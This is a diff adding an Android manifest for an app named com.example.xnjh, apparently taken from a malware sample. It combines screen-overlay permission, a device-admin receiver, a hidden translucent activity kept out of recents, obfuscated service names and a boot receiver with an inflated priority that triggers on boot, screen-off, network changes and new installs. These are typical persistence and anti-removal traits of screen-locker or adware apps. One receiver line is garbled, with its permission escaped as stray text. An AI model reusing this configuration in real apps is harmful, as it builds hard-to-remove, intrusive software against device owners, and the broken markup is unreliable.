@@ -1,0 +1,37 @@
+<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.example.xnjh" platformBuildVersionCode="21" platformBuildVersionName="5.0-1521886">
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
+    <application android:allowBackup="true" android:debuggable="true" android:icon="@drawable/ic" android:label="@string/app_name" android:theme="@style/AppTheme">
+        <activity android:label="@string/app_name" android:name=".MainActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity>
+        <receiver android:description="@string/hello" android:name=".MyAdmin">	android:permission="android.permission.BIND_DEVICE_ADMIN"&gt;
+<meta-data android:name="android.app.device_admin" android:resource="@xml/my_admin"/>
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED"/>
+            </intent-filter>
+        </receiver>
+        <service android:name="llxfc"/>
+        <service android:name="com.lemi.pgk.HSlemi"/>
+        <activity android:excludeFromRecents="true" android:name="com.lemi.pgk.HAlemi" android:screenOrientation="portrait" android:theme="@android:style/Theme.Translucent"/>
+        <receiver android:name=".BootBroadcastReceiver">
+            <intent-filter android:priority="448870015">
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+                <action android:name="android.intent.ACTION_SCREEN_OFF"/>
+                <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+                <action android:name="android.net.wifi.WIFI_STATE_CHANGED"/>
+                <action android:name="android.net.wifi.STATE_CHANGE"/>
+                <category android:name="android.intent.category.HOME"/>
+            </intent-filter>
+            <intent-filter>
+                <action android:name="android.intent.action.PACKAGE_ADDED"/>
+                <data android:scheme="package"/>
+            </intent-filter>
+        </receiver>
+        <meta-data android:name="XD_LM_DIA" android:value="dfcdfae09ebe4e4aaef2ce70e41ab465"/>
+    </application>
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+</manifest>
